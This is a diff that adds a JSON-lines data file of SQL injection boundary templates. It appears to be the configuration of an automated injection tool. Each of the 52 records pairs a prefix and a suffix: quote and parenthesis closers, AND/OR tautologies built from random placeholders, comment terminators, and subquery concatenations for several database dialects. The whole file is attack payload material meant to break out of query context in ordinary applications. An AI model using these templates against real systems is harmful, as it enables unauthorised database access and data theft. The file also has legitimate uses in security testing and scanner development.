@@ -1,0 +1,52 @@
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": ")", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 1, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": ")", "suffix": " AND ([RANDNUM]=[RANDNUM]"}
+{"level": 2, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": "))", "suffix": " AND (([RANDNUM]=[RANDNUM]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": ")))", "suffix": " AND ((([RANDNUM]=[RANDNUM]"}
+{"level": 1, "clause": [0], "where": [1, 2, 3], "ptype": 1, "prefix": null, "suffix": null}
+{"level": 1, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": null, "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": null, "suffix": "# [RANDSTR]"}
+{"level": 4, "clause": [9], "where": [1, 2], "ptype": 1, "prefix": ") WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 4, "clause": [9], "where": [1, 2], "ptype": 1, "prefix": " WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [9], "where": [1], "ptype": 1, "prefix": "+(SELECT [RANDSTR] WHERE [RANDNUM]=[RANDNUM]", "suffix": ")+"}
+{"level": 5, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": ")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 4, "clause": [1], "where": [1, 2], "ptype": 1, "prefix": ") AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 4, "clause": [1], "where": [1], "ptype": 1, "prefix": "` WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [1], "where": [1], "ptype": 1, "prefix": "`) WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 4, "clause": [8], "where": [1], "ptype": 6, "prefix": "`=`[ORIGINAL]`", "suffix": " AND `[ORIGINAL]`=`[ORIGINAL]"}
+{"level": 5, "clause": [8], "where": [1], "ptype": 6, "prefix": "]-(SELECT 0 WHERE [RANDNUM]=[RANDNUM]", "suffix": ")|[[ORIGINAL]"}
+{"level": 4, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "')", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 3, "clause": [1, 2, 3], "where": [1, 2], "ptype": 2, "prefix": "'", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [1], "where": [1, 2], "ptype": 4, "prefix": "\"", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 1, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "')", "suffix": " AND ('[RANDSTR]'='[RANDSTR]"}
+{"level": 2, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "'))", "suffix": " AND (('[RANDSTR]'='[RANDSTR]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "')))", "suffix": " AND ((('[RANDSTR]'='[RANDSTR]"}
+{"level": 1, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "'", "suffix": " AND '[RANDSTR]'='[RANDSTR]"}
+{"level": 2, "clause": [1], "where": [1, 2], "ptype": 3, "prefix": "')", "suffix": " AND ('[RANDSTR]' LIKE '[RANDSTR]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 3, "prefix": "'))", "suffix": " AND (('[RANDSTR]' LIKE '[RANDSTR]"}
+{"level": 4, "clause": [1], "where": [1, 2], "ptype": 3, "prefix": "')))", "suffix": " AND ((('[RANDSTR]' LIKE '[RANDSTR]"}
+{"level": 2, "clause": [1], "where": [1, 2], "ptype": 3, "prefix": "'", "suffix": " AND '[RANDSTR]' LIKE '[RANDSTR]"}
+{"level": 2, "clause": [1], "where": [1, 2], "ptype": 4, "prefix": "\")", "suffix": " AND (\"[RANDSTR]\"=\"[RANDSTR]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 4, "prefix": "\"))", "suffix": " AND ((\"[RANDSTR]\"=\"[RANDSTR]"}
+{"level": 4, "clause": [1], "where": [1, 2], "ptype": 4, "prefix": "\")))", "suffix": " AND (((\"[RANDSTR]\"=\"[RANDSTR]"}
+{"level": 2, "clause": [1], "where": [1, 2], "ptype": 4, "prefix": "\"", "suffix": " AND \"[RANDSTR]\"=\"[RANDSTR]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 5, "prefix": "\")", "suffix": " AND (\"[RANDSTR]\" LIKE \"[RANDSTR]"}
+{"level": 4, "clause": [1], "where": [1, 2], "ptype": 5, "prefix": "\"))", "suffix": " AND ((\"[RANDSTR]\" LIKE \"[RANDSTR]"}
+{"level": 5, "clause": [1], "where": [1, 2], "ptype": 5, "prefix": "\")))", "suffix": " AND (((\"[RANDSTR]\" LIKE \"[RANDSTR]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 5, "prefix": "\"", "suffix": " AND \"[RANDSTR]\" LIKE \"[RANDSTR]"}
+{"level": 3, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "'", "suffix": " OR '[RANDSTR1]'='[RANDSTR2]"}
+{"level": 5, "clause": [9], "where": [1, 2], "ptype": 2, "prefix": "') WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [9], "where": [1, 2], "ptype": 2, "prefix": "\") WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 4, "clause": [9], "where": [1, 2], "ptype": 2, "prefix": "' WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [9], "where": [1, 2], "ptype": 4, "prefix": "\" WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [9], "where": [1], "ptype": 2, "prefix": "'||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]", "suffix": ")||'"}
+{"level": 5, "clause": [9], "where": [1], "ptype": 2, "prefix": "'||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]", "suffix": ")||'"}
+{"level": 5, "clause": [9], "where": [1], "ptype": 2, "prefix": "'+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]", "suffix": ")+'"}
+{"level": 5, "clause": [9], "where": [1], "ptype": 2, "prefix": "||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]", "suffix": ")||"}
+{"level": 5, "clause": [9], "where": [1], "ptype": 2, "prefix": "||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]", "suffix": ")||"}
+{"level": 5, "clause": [9], "where": [1], "ptype": 2, "prefix": "+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]", "suffix": ")+"}
+{"level": 5, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "\")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 4, "clause": [1], "where": [1, 2], "ptype": 2, "prefix": "') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [1], "where": [1, 2], "ptype": 4, "prefix": "\") AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]", "suffix": "[GENERIC_SQL_COMMENT]"}
+{"level": 5, "clause": [8], "where": [1], "ptype": 6, "prefix": "\"=\"[ORIGINAL]\"", "suffix": " AND \"[ORIGINAL]\"=\"[ORIGINAL]"}
+{"level": 4, "clause": [1], "where": [1], "ptype": 2, "prefix": "' IN BOOLEAN MODE)", "suffix": "#"}
